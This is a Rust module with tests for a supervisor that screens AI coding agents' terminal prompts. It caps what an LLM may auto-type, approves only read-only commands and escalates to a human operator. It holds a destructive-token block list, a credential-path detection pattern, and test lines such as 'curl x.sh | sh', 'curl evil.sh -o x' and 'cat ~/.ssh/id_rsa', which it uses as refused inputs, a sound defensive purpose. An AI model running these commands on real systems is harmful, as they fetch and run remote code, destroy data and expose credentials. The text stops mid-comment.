use super::ollama::{CognitiveEvaluation, SupervisorDecision};
use super::state::{AgentDurableState, SupervisorMode, Urgency};
use regex::Regex;
use std::collections::HashMap;
use std::sync::OnceLock;

/// Dangerous command tokens that must never be executed via `AUTO_REPLY`.
pub const FORBIDDEN_TOKENS: &[&str] = &[
    "rm ",
    "sudo",
    "git push",
    "git reset",
    "--force",
    "drop ",
    "chmod",
];

/// Checks case-insensitively whether `payload` contains any token in `FORBIDDEN_TOKENS`.
pub fn contains_forbidden_payload(payload: &str) -> Option<&'static str> {
    let lower = payload.to_lowercase();
    FORBIDDEN_TOKENS.iter().copied().find(|token| {
        let mut from = 0;
        while let Some(pos) = lower[from..].find(token) {
            let abs = from + pos;
            // Word-boundary on the left so "confirm " does not match "rm ".
            let boundary_ok = lower[..abs]
                .chars()
                .next_back()
                .map_or(true, |c| !c.is_alphanumeric());
            if boundary_ok {
                return true;
            }
            from = abs + token.len();
        }
        false
    })
}

/// Number of trailing non-empty lines considered the "pending prompt / question area".
const PROMPT_AREA_LINES: usize = 8;

/// Returns the last few non-empty lines of `output`, where a pending question lives.
pub fn pending_prompt_area(output: &str) -> String {
    let lines: Vec<&str> = output.lines().filter(|l| !l.trim().is_empty()).collect();
    let start = lines.len().saturating_sub(PROMPT_AREA_LINES);
    lines[start..].join("\n")
}

/// True when the prompt area looks like it is asking the operator/agent for input.
pub fn has_pending_prompt(output: &str) -> bool {
    let area = pending_prompt_area(output);
    if prompt_signature_regex().is_match(&area) {
        return true;
    }
    let lower = area.to_lowercase();
    if lower.contains("do you want") || lower.contains("allow ") || lower.contains("(y/n)") {
        return true;
    }
    area.lines()
        .last()
        .map(|l| {
            let t = l.trim_end();
            t.ends_with('?') || t.ends_with(':')
        })
        .unwrap_or(false)
}

/// Deterministic destructive-command detection restricted to the pending prompt area and the payload
/// (never arbitrary scrollback such as "error" / "aborted" lines).
pub fn detect_destructive(output: &str, payload: &str) -> Option<&'static str> {
    contains_forbidden_payload(&pending_prompt_area(output))
        .or_else(|| contains_forbidden_payload(payload))
}

/// Enforces the "only blocked agents get action cards" policy deterministically.
///
/// * Not blocked  -> always `NoOp` (the rolling summary is still kept by the caller).
/// * Blocked      -> destructive command in the prompt area/payload forces a `Critical` alert with
///   payload `n`; otherwise LLM urgency is capped at `Normal`; an alert without a pending prompt
///   carries no payload.
pub fn enforce_blocked_policy(
    is_blocked: bool,
    output: &str,
    mut eval: CognitiveEvaluation,
) -> CognitiveEvaluation {
    if !is_blocked {
        eval.decision = SupervisorDecision::NoOp;
        eval.urgency = Urgency::Low;
        eval.hc_command_payload.clear();
        eval.reason_for_operator.clear();
        return eval;
    }

    if let Some(token) = detect_destructive(output, &eval.hc_command_payload) {
        eval.decision = SupervisorDecision::AlertOperator;
        eval.urgency = Urgency::Critical;
        eval.hc_command_payload = "n".to_string();
        append_reason(
            &mut eval.reason_for_operator,
            &format!("[Comando destrutivo detectado no terminal: {token}]"),
        );
        return eval;
    }

    if eval.urgency == Urgency::Critical {
        eval.urgency = Urgency::Normal;
    }
    // Blocked on a visible prompt and the model chose to do nothing: nobody would answer and
    // nobody would be told (the same screen is not re-evaluated). Hand it to the operator.
    if eval.decision == SupervisorDecision::NoOp && has_pending_prompt(output) {
        eval.decision = SupervisorDecision::AlertOperator;
        eval.urgency = Urgency::Normal;
        eval.hc_command_payload.clear();
        append_reason(
            &mut eval.reason_for_operator,
            "[Agente aguardando resposta; o supervisor não decidiu]",
        );
        return eval;
    }
    if eval.decision == SupervisorDecision::AlertOperator && !has_pending_prompt(output) {
        eval.hc_command_payload.clear();
    }
    eval
}

fn yn_prompt_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)[\[(]\s*y(es)?\s*/\s*n(o)?\s*[\])]").expect("valid y/n prompt regex")
    })
}

fn yn_hint_payload_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"^[\[(]?\s*y(es)?\s*/\s*n(o)?\s*[\])]?$").expect("valid y/n hint regex")
    })
}

fn identifier_payload_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"^[a-z]+(_[a-z]+)+$").expect("valid identifier regex"))
}

fn yes_no_question_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)\b(continue|proceed)\?").expect("valid yes/no question regex")
    })
}

fn reject_auto_reply(mut eval: CognitiveEvaluation, note: &str) -> CognitiveEvaluation {
    eval.decision = SupervisorDecision::AlertOperator;
    if eval.urgency == Urgency::Low {
        eval.urgency = Urgency::Normal;
    }
    eval.hc_command_payload.clear();
    append_reason(&mut eval.reason_for_operator, note);
    eval
}

/// Restricts what an `AUTO_REPLY` may type into a terminal to single keys: `y`, `n`, a 1–2 digit
/// menu choice, or Enter (empty). Anything else — text copied from the screen, free-form
/// instructions — is never typed; the evaluation becomes an operator alert without payload.
///
/// An LLM `AUTO_REPLY` on a permission request (`kind == "permission"`, a menu with `1. Yes`, or
/// an hc status `msg` naming a tool) is never sent; only the deterministic read-only fast path may
/// approve those. On any numbered menu, `y`/`yes`/`n`/`no` and empty Enter are rejected; only digit
/// keys may be used. Plain yes/no prompts (`[y/N]`, `(y/n)`, `Continue?`, `Proceed?`) that are
/// not permission requests or numbered menus keep `y`/`n` normalization. A prompt whose hc status
/// kind is `question` is never auto-answered. Must run after `enforce_blocked_policy`.
pub fn sanitize_auto_reply(
    output: &str,
    kind: Option<&str>,
    msg: Option<&str>,
    mut eval: CognitiveEvaluation,
) -> CognitiveEvaluation {
    if eval.decision != SupervisorDecision::AutoReply {
        return eval;
    }
    let raw = eval.hc_command_payload.trim().to_string();
    let p = raw.to_lowercase();
    let area = pending_prompt_area(output);
    let [menu_yes, menu_item, ..] = fast_path_regexes();
    let area_lines: Vec<&str> = area.lines().map(str::trim).collect();

    if kind.is_some_and(|k| k.eq_ignore_ascii_case("question")) {
        let shown: String = raw.chars().take(60).collect();
        return reject_auto_reply(
            eval,
            &format!("[Resposta automática bloqueada: '{shown}' não serve para este prompt]"),
        );
    }

    let is_permission_request = kind.is_some_and(|k| k.eq_ignore_ascii_case("permission"))
        || area_lines.iter().any(|l| menu_yes.is_match(l))
        || msg.is_some_and(|m| status_msg_regex().is_match(m.trim()));
    if is_permission_request {
        return reject_auto_reply(
            eval,
            "[Resposta automática bloqueada: pedido de permissão fora da lista de leitura]",
        );
    }

    let has_menu_item = area_lines.iter().any(|l| menu_item.is_match(l));
    let yes_no_prompt = !has_menu_item
        && (yn_prompt_regex().is_match(&area) || yes_no_question_regex().is_match(&area));
    let is_digit_key =
        |k: &str| !k.is_empty() && k.len() <= 2 && k.chars().all(|c| c.is_ascii_digit());
    let is_key = |k: &str| (!has_menu_item && k.is_empty()) || is_digit_key(k);

    let normalized = match p.as_str() {
        "y" | "yes" if yes_no_prompt => Some("y".to_string()),
        "n" | "no" if yes_no_prompt => Some("n".to_string()),
        _ if yes_no_prompt
            && (yn_hint_payload_regex().is_match(&p)
                || identifier_payload_regex().is_match(&p)) =>
        {
            Some("y".to_string())
        }
        k if is_key(k) => Some(k.to_string()),
        _ => None,
    };
    match normalized {
        Some(key) => {
            eval.hc_command_payload = key;
            eval
        }
        None => {
            let shown: String = raw.chars().take(60).collect();
            reject_auto_reply(
                eval,
                &format!("[Resposta automática bloqueada: '{shown}' não serve para este prompt]"),
            )
        }
    }
}

fn fast_path_regexes() -> &'static [Regex; 6] {
    static RE: OnceLock<[Regex; 6]> = OnceLock::new();
    RE.get_or_init(|| {
        [
            // 0: permission menu "1. Yes" (Claude Code style, optional ❯ cursor)
            Regex::new(r"(?i)^\W*1[.)]\s*yes\b").unwrap(),
            // 1: any menu item line
            Regex::new(r"^\W*\d+[.)]\s").unwrap(),
            // 2: prompt chrome without a command
            Regex::new(r"(?i)^\W*(do you want|would you like)\b|^\W*(bash command|command|permission required)\W*$").unwrap(),
            // 3: shell metacharacters (more than one command, redirection, substitution)
            Regex::new(r"\||;|&&|>|<|\$\(|`").unwrap(),
            // 4: read-only allowlist
            Regex::new(r"^(ls|cat|head|tail|wc|pwd|rg|grep|git\s+(status|diff|log|show))(\s|$)").unwrap(),
            // 5: sensitive paths
            Regex::new(r"(?i)\.ssh|\.gnupg|\.env|id_rsa|id_ed25519|secret|token|credential|password|key|/etc/shadow").unwrap(),
        ]
    })
}

fn inline_prompt_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"(?i)^(?P<lead>[^:]*?):\s+(?P<cmd>.+?)\s*\?\s*[\[(]\s*y(es)?\s*/\s*n(o)?\s*[\])]\s*$",
        )
        .expect("valid inline prompt regex")
    })
}

fn read_tool_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"\bread\b").expect("valid read tool regex"))
}

fn shell_tool_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"\b(bash|shell|command|run)\b").expect("valid shell tool regex"))
}

fn status_msg_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)^approve\s+(?P<tool>[\w-]+)\s*:\s*(?P<arg>.+)$")
            .expect("valid status msg regex")
    })
}

/// A named tool request: a Read tool on one non-sensitive file (same as `cat`), or a shell tool
/// running one allowlisted read-only command. Write/Edit/other tools are never fast-pathed.
fn approve_tool_request(tool: &str, target: &str, payload: &str) -> Option<(String, String)> {
    let [_, _, _, metachar, allow, sensitive] = fast_path_regexes();
    let tool = tool.to_ascii_lowercase();
    let target = target.trim();
    if read_tool_regex().is_match(&tool) {
        let single = !target.is_empty() && !target.contains(char::is_whitespace);
        if single && !metachar.is_match(target) && !sensitive.is_match(target) {
            return Some((payload.to_string(), format!("Read {target}")));
        }
        return None;
    }
    if !shell_tool_regex().is_match(&tool) {
        return None;
    }
    if metachar.is_match(target) || !allow.is_match(target) || sensitive.is_match(target) {
        return None;
    }
    Some((payload.to_string(), target.to_string()))
}

fn command_prefix_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)^\s*(?:[$>❯]\s+|bash\(|run:?\s+|command:?\s+|execute:?\s+)")
            .expect("valid command prefix regex")
    })
}

/// Deterministic approval of trivial read-only commands, before (and without) the LLM.
///
/// Returns `(payload, command)` when the pending prompt is a yes/no prompt (`y`) or a permission
/// menu with `1. Yes` (`1`), the command — the nearest non-chrome line above the prompt — is a
/// single allowlisted read-only command without shell metacharacters or sensitive paths, the
/// prompt area holds nothing destructive, and the hc kind is not `question`. Otherwise `None`
/// and the normal LLM flow decides. See docs/superpowers/specs/2026-11-15-readonly-fast-path-design.md.
pub fn readonly_fast_path(output: &str, kind: Option<&str>) -> Option<(String, String)> {
    readonly_fast_path_with_msg(output, kind, None)
}

/// Like [`readonly_fast_path`], but when hc's status message names the request
/// (`approve Bash: <cmd>`, `approve Read: <file>` — Claude Code's OSC 7501 `msg`), the command is
/// taken from it instead of the screen; the screen only decides the key (`1` on a `1. Yes` menu,
/// `y` on a yes/no prompt) and that a prompt is actually showing.
pub fn readonly_fast_path_with_msg(
    output: &str,
    kind: Option<&str>,
    msg: Option<&str>,
) -> Option<(String, String)> {
    if kind.is_some_and(|k| k.eq_ignore_ascii_case("question")) {
        return None;
    }
    if detect_destructive(output, msg.unwrap_or("")).is_some() {
        return None;
    }
    let [menu_yes, menu_item, chrome, metachar, allow, sensitive] = fast_path_regexes();
    let area = pending_prompt_area(output);
    let lines: Vec<&str> = area
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .collect();
    let is_yes_no = |l: &str| yn_prompt_regex().is_match(l) || yes_no_question_regex().is_match(l);

    // A permission menu wins: its question line ("Do you want to proceed?") is not a y/n prompt.
    // `prompt_idx` is where the prompt starts; the command is searched *above* it, so lines
    // printed after the prompt (timeouts, hints) are ignored.
    let (payload, prompt_idx) = if let Some(i) = lines.iter().position(|l| menu_yes.is_match(l)) {
        ("1", i)
    } else {
        ("y", lines.iter().rposition(|l| is_yes_no(l))?)
    };

    // The request as hc reports it, e.g. `approve Bash: git diff --stat`.
    if let Some(caps) = msg.and_then(|m| status_msg_regex().captures(m.trim())) {
        return approve_tool_request(&caps["tool"], &caps["arg"], payload);
    }

    // Command inline in the prompt line, e.g. `Allow bash tool: ls -la src/ ? [y/N]`.
    if let Some(caps) = inline_prompt_regex().captures(lines[prompt_idx]) {
        return approve_tool_request(&caps["lead"], &caps["cmd"], payload);
    }

    let raw = lines[..prompt_idx]
        .iter()
        .rev()
        .find(|l| !is_yes_no(l) && !menu_item.is_match(l) && !chrome.is_match(l))?;
    let had_bash_paren = raw.to_ascii_lowercase().starts_with("bash(");
    let mut cmd = command_prefix_regex().replace(raw, "").trim().to_string();
    if had_bash_paren {
        cmd = cmd.trim_end_matches(')').trim().to_string();
    }
    // A command shown wrapped in backticks or quotes: unwrap one matching pair.
    for q in ['`', '"', '\''] {
        if cmd.len() >= 2 && cmd.starts_with(q) && cmd.ends_with(q) {
            cmd = cmd[1..cmd.len() - 1].trim().to_string();
            break;
        }
    }

    if metachar.is_match(&cmd) || !allow.is_match(&cmd) || sensitive.is_match(&cmd) {
        return None;
    }
    Some((payload.to_string(), cmd))
}

fn error_signature_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"ERR!|panic:|thread '.*' panicked|Traceback \(most recent call last\)|FATAL|Segmentation fault|error\[E",
        )
        .expect("valid error signature regex")
    })
}

fn prompt_signature_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"\[y/N\]|\[Y/n\]|\(y/n\)|(?i:Continue\?|Press Enter|Proceed\?)")
            .expect("valid prompt signature regex")
    })
}

/// Detects deterministic error, interactive prompt, or repeated-line loop signatures.
pub fn has_error_or_loop_signature(output: &str) -> bool {
    if error_signature_regex().is_match(output) || prompt_signature_regex().is_match(output) {
        return true;
    }

    let lines: Vec<&str> = output.lines().collect();
    let tail = if lines.len() > 25 {
        &lines[lines.len() - 25..]
    } else {
        &lines[..]
    };

    let mut counts: HashMap<&str, usize> = HashMap::new();
    for line in tail {
        let trimmed = line.trim();
        if trimmed.chars().count() >= 12 && trimmed.chars().any(|c| c.is_alphanumeric()) {
            let count = counts.entry(trimmed).or_insert(0);
            *count += 1;
            if *count >= 3 {
                return true;
            }
        }
    }

    false
}

fn append_reason(reason: &mut String, note: &str) {
    if reason.trim().is_empty() {
        reason.clear();
        reason.push_str(note);
    } else {
        if !reason.ends_with(' ') {
            reason.push(' ');
        }
        reason.push_str(note);
    }
}

/// Applies deterministic guardrails to an LLM evaluation before any `hc` side effect.
pub fn validate_evaluation(
    state: &AgentDurableState,
    mode: SupervisorMode,
    mut eval: CognitiveEvaluation,
) -> CognitiveEvaluation {
    // Rule 1: Loop Breaker
    if eval.decision == SupervisorDecision::AutoReply
        && state.consecutive_auto_replies >= state.max_auto_replies
    {
        eval.decision = SupervisorDecision::AlertOperator;
        append_reason(
            &mut eval.reason_for_operator,
            "[Limite de auto-resposta atingido]",
        );
    }

    // Rule 2: Forbidden Payload Filter
    if eval.decision == SupervisorDecision::AutoReply {
        if let Some(token) = contains_forbidden_payload(&eval.hc_command_payload) {
            eval.decision = SupervisorDecision::AlertOperator;
            eval.urgency = Urgency::Critical;
            append_reason(
                &mut eval.reason_for_operator,
                &format!("[Payload bloqueado pelo filtro de segurança: {token}]"),
            );
        }
    }

    // Rule 3: Empty Payload Guard
    if eval.decision == SupervisorDecision::AutoReply && eval.hc_command_payload.trim().is_empty() {
        eval.decision = SupervisorDecision::NoOp;
    }

    // Rule 4: Supervisor Mode Filter
    if mode == SupervisorMode::AlertOnly && eval.decision == SupervisorDecision::AutoReply {
        eval.decision = SupervisorDecision::AlertOperator;
        append_reason(&mut eval.reason_for_operator, "[Modo Somente Alerta ativo]");
    }

    eval
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::supervisor::state::LifecycleState;

    fn sample_eval(decision: SupervisorDecision, payload: &str) -> CognitiveEvaluation {
        CognitiveEvaluation {
            updated_summary: "Agente aguardando confirmação.".to_string(),
            detected_state: LifecycleState::WaitingConfirmation,
            decision,
            urgency: Urgency::Normal,
            hc_command_payload: payload.to_string(),
            reason_for_operator: "Confirmação necessária.".to_string(),
        }
    }

    #[test]
    fn test_loop_breaker_downgrades_auto_reply() {
        let mut state = AgentDurableState::new("t1", "worker", 2, 100);
        state.consecutive_auto_replies = 2;

        let validated = validate_evaluation(
            &state,
            SupervisorMode::SemiAuto,
            sample_eval(SupervisorDecision::AutoReply, "y"),
        );

        assert_eq!(validated.decision, SupervisorDecision::AlertOperator);
        assert!(validated
            .reason_for_operator
            .ends_with("[Limite de auto-resposta atingido]"));
    }

    #[test]
    fn test_forbidden_tokens_downgrade_to_critical_alert() {
        let state = AgentDurableState::new("t1", "worker", 2, 100);

        for token in FORBIDDEN_TOKENS {
            let payload = format!("run {} something", token.to_uppercase());
            let validated = validate_evaluation(
                &state,
                SupervisorMode::SemiAuto,
                sample_eval(SupervisorDecision::AutoReply, &payload),
            );
            assert_eq!(
                validated.decision,
                SupervisorDecision::AlertOperator,
                "token {token} should be blocked"
            );
            assert_eq!(validated.urgency, Urgency::Critical);
            assert!(validated.reason_for_operator.contains(&format!(
                "[Payload bloqueado pelo filtro de segurança: {token}]"
            )));
        }
    }

    #[test]
    fn test_empty_payload_downgrades_to_noop() {
        let state = AgentDurableState::new("t1", "worker", 2, 100);
        let validated = validate_evaluation(
            &state,
            SupervisorMode::SemiAuto,
            sample_eval(SupervisorDecision::AutoReply, "   "),
        );
        assert_eq!(validated.decision, SupervisorDecision::NoOp);
    }

    #[test]
    fn test_alert_only_mode_downgrades_auto_reply() {
        let state = AgentDurableState::new("t1", "worker", 2, 100);
        let validated = validate_evaluation(
            &state,
            SupervisorMode::AlertOnly,
            sample_eval(SupervisorDecision::AutoReply, "y"),
        );
        assert_eq!(validated.decision, SupervisorDecision::AlertOperator);
        assert!(validated
            .reason_for_operator
            .contains("[Modo Somente Alerta ativo]"));
    }

    #[test]
    fn test_error_and_loop_signatures() {
        let normal = "Compiling cockpit v0.1.0\nFinished dev [unoptimized] target(s)";
        assert!(!has_error_or_loop_signature(normal));

        let borders = "================\n================\n================";
        assert!(!has_error_or_loop_signature(borders));

        assert!(has_error_or_loop_signature("Do you want to proceed? [y/N]"));
        assert!(has_error_or_loop_signature("Press Enter to continue"));
        assert!(has_error_or_loop_signature(
            "Traceback (most recent call last):\n  File \"app.py\", line 1"
        ));
        assert!(has_error_or_loop_signature(
            "thread 'main' panicked at 'boom'"
        ));
        assert!(has_error_or_loop_signature(
            "error[E0308]: mismatched types"
        ));

        let repeated = "Error: connection refused on port 5432\n\
                        Error: connection refused on port 5432\n\
                        Error: connection refused on port 5432";
        assert!(has_error_or_loop_signature(repeated));
    }

    const HOOKS_ERROR_OUTPUT: &str =
        "HooksError: git process aborted after 2000ms in tickets-pane\n\
        HooksError: git process aborted after 2000ms in tickets-pane\n\
        Waiting for background agent to finish...";

    #[test]
    fn test_working_agent_with_hooks_error_is_noop() {
        let mut eval = sample_eval(SupervisorDecision::AlertOperator, "n");
        eval.urgency = Urgency::Critical;
        let out = enforce_blocked_policy(false, HOOKS_ERROR_OUTPUT, eval);
        assert_eq!(out.decision, SupervisorDecision::NoOp);
        assert_eq!(out.urgency, Urgency::Low);
        assert!(out.hc_command_payload.is_empty());
        assert_eq!(out.updated_summary, "Agente aguardando confirmação.");
    }

    #[test]
    fn test_hooks_error_text_never_triggers_destructive_detection() {
        assert!(detect_destructive(HOOKS_ERROR_OUTPUT, "").is_none());
        assert!(detect_destructive("Please confirm the change", "").is_none());
    }

    #[test]
    fn test_blocked_force_push_prompt_is_critical_alert() {
        let output = "Bash command\n  git push --force origin main\nDo you want to proceed? (y/n)";
        let out = enforce_blocked_policy(
            true,
            output,
            sample_eval(SupervisorDecision::AutoReply, "y"),
        );
        assert_eq!(out.decision, SupervisorDecision::AlertOperator);
        assert_eq!(out.urgency, Urgency::Critical);
        assert_eq!(out.hc_command_payload, "n");
    }

    #[test]
    fn test_blocked_safe_prompt_keeps_auto_reply_and_caps_llm_critical() {
        let output = "Run cargo test?\nProceed? (y/n)";
        let out = enforce_blocked_policy(
            true,
            output,
            sample_eval(SupervisorDecision::AutoReply, "y"),
        );
        assert_eq!(out.decision, SupervisorDecision::AutoReply);

        let mut alert = sample_eval(SupervisorDecision::AlertOperator, "n");
        alert.urgency = Urgency::Critical;
        let out = enforce_blocked_policy(true, output, alert);
        assert_eq!(out.urgency, Urgency::Normal);
    }

    #[test]
    fn test_alert_without_pending_prompt_has_no_payload() {
        let mut alert = sample_eval(SupervisorDecision::AlertOperator, "n");
        alert.urgency = Urgency::Normal;
        let out = enforce_blocked_policy(true, "Task finished.\nAll done", alert);
        assert_eq!(out.decision, SupervisorDecision::AlertOperator);
        assert!(out.hc_command_payload.is_empty());
    }

    fn auto(payload: &str) -> CognitiveEvaluation {
        let mut e = sample_eval(SupervisorDecision::AutoReply, payload);
        e.urgency = Urgency::Low;
        e
    }

    #[test]
    fn sanitize_yn_prompt_echoed_hint_becomes_y() {
        // Test 2 / safe-ls: the model sent the literal "[y/N]" copied from the screen.
        let out = sanitize_auto_reply(
            "List files in src/?\nProceed? [y/N]",
            None,
            None,
            auto("[y/N]"),
        );
        assert_eq!(out.decision, SupervisorDecision::AutoReply);
        assert_eq!(out.hc_command_payload, "y");
    }

    #[test]
    fn sanitize_yn_prompt_maps_words_and_case() {
        let area = "Read README.md? (y/n)";
        assert_eq!(
            sanitize_auto_reply(area, None, None, auto(" Yes ")).hc_command_payload,
            "y"
        );
        assert_eq!(
            sanitize_auto_reply(area, None, None, auto("N")).hc_command_payload,
            "n"
        );
        assert_eq!(
            sanitize_auto_reply(area, None, None, auto("continue_readonly")).hc_command_payload,
            "y"
        );
    }

    #[test]
    fn sanitize_free_text_becomes_alert_without_payload() {
        let out = sanitize_auto_reply("Proceed? [y/N]", None, None, auto("sure, go ahead"));
        assert_eq!(out.decision, SupervisorDecision::AlertOperator);
        assert_eq!(out.urgency, Urgency::Normal);
        assert!(out.hc_command_payload.is_empty());
        assert!(out.reason_for_operator.contains("sure, go ahead"));

        let out = sanitize_auto_reply("Waiting for input...", None, None, auto("cargo test"));
        assert_eq!(out.decision, SupervisorDecision::AlertOperator);
        assert!(out.hc_command_payload.is_empty());
    }

    #[test]
    fn sanitize_numbered_choice_and_enter_allowed() {
        let menu = "Which one?\n1. Keep\n2. Replace\n3. Abort\nChoose:";
        assert_eq!(
            sanitize_auto_reply(menu, None, None, auto("2")).hc_command_payload,
            "2"
        );
        assert_eq!(
            sanitize_auto_reply(menu, None, None, auto("Replace")).decision,
            SupervisorDecision::AlertOperator
        );
        let enter = sanitize_auto_reply("Press Enter to continue", None, None, auto(""));
        assert_eq!(enter.decision, SupervisorDecision::AutoReply);
        assert_eq!(enter.hc_command_payload, "");
    }

    #[test]
    fn sanitize_leaves_other_decisions_untouched() {
        let alert = sample_eval(SupervisorDecision::AlertOperator, "n");
        assert_eq!(
            sanitize_auto_reply("rm -rf? [y/N]", None, None, alert.clone()),
            alert
        );
    }

    #[test]
    fn sanitize_y_on_numbered_question_becomes_alert() {
        // Test 4 / pergunta: "Responda 1, 2 ou 3" got "y" typed.
        let q = "Qual banco usar?\n1) Postgres\n2) SQLite\n3) Mongo\nResponda 1, 2 ou 3:";
        let out = sanitize_auto_reply(q, None, None, auto("y"));
        assert_eq!(out.decision, SupervisorDecision::AlertOperator);
        assert!(out.hc_command_payload.is_empty());
    }

    #[test]
    fn sanitize_question_kind_is_never_auto_answered() {
        let q = "Qual banco usar?\n1) Postgres\n2) SQLite\nResponda 1 ou 2:";
        let out = sanitize_auto_reply(q, Some("question"), None, auto("2"));
        assert_eq!(out.decision, SupervisorDecision::AlertOperator);
        assert!(out.hc_command_payload.is_empty());
        // A non-permission numbered menu without "question" kind may still be answered with a number,
        // while a permission menu is blocked on the LLM path.
        let choice = "Which mode?\n1. Fast\n2. Thorough";
        assert_eq!(
            sanitize_auto_reply(choice, None, None, auto("1")).hc_command_payload,
            "1"
        );
        let perm = "Allow Bash(ls)?\n1. Yes\n2. No";
        let perm_out = sanitize_auto_reply(perm, Some("permission"), None, auto("1"));
        assert_eq!(perm_out.decision, SupervisorDecision::AlertOperator);
        assert!(perm_out.hc_command_payload.is_empty());
    }

    #[test]
    fn blocked_noop_with_pending_prompt_alerts_operator() {
        // Test 3/4 / write-ambiguo: NO_OP on a blocked prompt meant nobody answered and nobody was told.
        let noop = sample_eval(SupervisorDecision::NoOp, "");
        let out = enforce_blocked_policy(true, "Edit src/config.rs\nAllow? [y/N]", noop.clone());
        assert_eq!(out.decision, SupervisorDecision::AlertOperator);
        assert_eq!(out.urgency, Urgency::Normal);
        assert!(out.hc_command_payload.is_empty());
        // No pending prompt on screen (e.g. waiting on its own subagent): NO_OP stays.
        let out = enforce_blocked_policy(true, "Running subagent...", noop);
        assert_eq!(out.decision, SupervisorDecision::NoOp);
    }

    fn fast(screen: &str) -> Option<(String, String)> {
        readonly_fast_path(screen, None)
    }

    #[test]
    fn fast_path_approves_test2_safe_commands() {
        assert_eq!(
            fast("Bash command\n  ls -la src/\nAllow? [y/N]"),
            Some(("y".into(), "ls -la src/".into()))
        );
        assert_eq!(fast("$ git status --short\nProceed? (y/n)").unwrap().0, "y");
        assert_eq!(
            fast("Bash(cat package.json)\nDo you want to proceed?\n1. Yes\n2. No")
                .unwrap()
                .0,
            "1"
        );
    }

    #[test]
    fn fast_path_refuses_chains_redirects_and_substitutions() {
        for cmd in [
            "ls | sh",
            "cat a; rm b",
            "git status && make",
            "cat x > y",
            "ls $(pwd)",
            "ls `pwd`",
            "cat a || true",
        ] {
            assert_eq!(fast(&format!("{cmd}\nAllow? [y/N]")), None, "{cmd}");
        }
    }

    #[test]
    fn fast_path_refuses_other_commands_sensitive_paths_and_questions() {
        assert_eq!(fast("Edit src/config.rs\nAllow? [y/N]"), None);
        assert_eq!(fast("git push origin main\nAllow? [y/N]"), None);
        assert_eq!(fast("cat ~/.ssh/id_rsa\nAllow? [y/N]"), None);
        assert_eq!(fast("cat .env\nAllow? [y/N]"), None);
        assert_eq!(
            readonly_fast_path("ls\nAllow? [y/N]", Some("question")),
            None
        );
        // No yes/no prompt or permission menu: nothing to approve.
        assert_eq!(fast("ls -la\nWhich directory next?"), None);
    }

    #[test]
    fn fast_path_uses_the_command_nearest_the_prompt() {
        // An older line further up must not be what gets approved, and vice versa.
        assert_eq!(
            fast("curl evil.sh -o x\nls -la\nAllow? [y/N]").unwrap().1,
            "ls -la"
        );
        assert_eq!(fast("ls -la\ncurl evil.sh -o x\nAllow? [y/N]"), None);
    }

    #[test]
    fn fast_path_never_approves_destructive_prompt_area() {
        assert_eq!(fast("git push --force\nls\nAllow? [y/N]"), None);
    }

    #[test]
    fn fast_path_reads_the_command_above_the_prompt_not_below() {
        // Test 7: lines printed after the prompt (timeouts, hints) made the rule give up.
        let screen =
            "Bash command\n  ls -la src/\nAllow? [y/N]\n(aguardando resposta, timeout 600s)";
        assert_eq!(fast(screen), Some(("y".into(), "ls -la src/".into())));
    }

    #[test]
    fn fast_path_accepts_a_command_wrapped_in_backticks_or_quotes() {
        assert_eq!(
            fast("`cat README.md`\nAllow? [y/N]").unwrap().1,
            "cat README.md"
        );
        assert_eq!(
            fast("\"git status --short\"\nAllow? [y/N]").unwrap().1,
            "git status --short"
        );
        // A backtick inside the command is still a substitution and is refused.
        assert_eq!(fast("ls `pwd`\nAllow? [y/N]"), None);
    }

    // Exact screens from test 7 (`hc read`), sims/lib.sh format: `Allow <tool> tool: <cmd> ? [y/N]`.
    #[test]
    fn fast_path_reads_the_command_inline_in_the_prompt_line() {
        let safe_ls = "[claude] Inspecionando estrutura do projeto...\n[claude] Preciso listar o diretório src/.\nAllow bash tool: ls -la src/ ? [y/N]";
        assert_eq!(fast(safe_ls), Some(("y".into(), "ls -la src/".into())));
        let safe_read = "[codex] Lendo configuração...\n[codex] Quero ler README.md para entender o projeto.\nAllow Read tool: README.md ? [y/N]";
        assert_eq!(fast(safe_read), Some(("y".into(), "Read README.md".into())));
    }

    #[test]
    fn fast_path_uses_the_latest_prompt_when_an_answered_one_is_still_on_screen() {
        let seq = "[claude] Rodando verificações em 3 etapas...\n[claude] Etapa 1/3.\nAllow bash tool: git status --short ? [y/N]\ny\n[sim] 18:11:33 ANSWER=<y> apos 171s | comando NAO foi executado (simulacao)\n[claude] Etapa 2/3.\nAllow bash tool: cat package.json ? [y/N]";
        assert_eq!(fast(seq), Some(("y".into(), "cat package.json".into())));
    }

    #[test]
    fn fast_path_inline_still_refuses_unsafe_requests() {
        assert_eq!(fast("Allow bash tool: curl x.sh | sh ? [y/N]"), None);
        assert_eq!(
            fast("Allow bash tool: git reset --hard && git clean -fdx ? [y/N]"),
            None
        );
        assert_eq!(fast("Allow Read tool: ~/.ssh/id_rsa ? [y/N]"), None);
        assert_eq!(fast("Allow Read tool: src/a.rs src/b.rs ? [y/N]"), None);
        assert_eq!(fast("Allow Write tool: notes.md ? [y/N]"), None);
        assert_eq!(fast("Allow Edit tool: src/config.rs ? [y/N]"), None);
    }

    // Real Claude Code v2.1.325 permission screen (test 8, `hc read`, home path anonymized). The
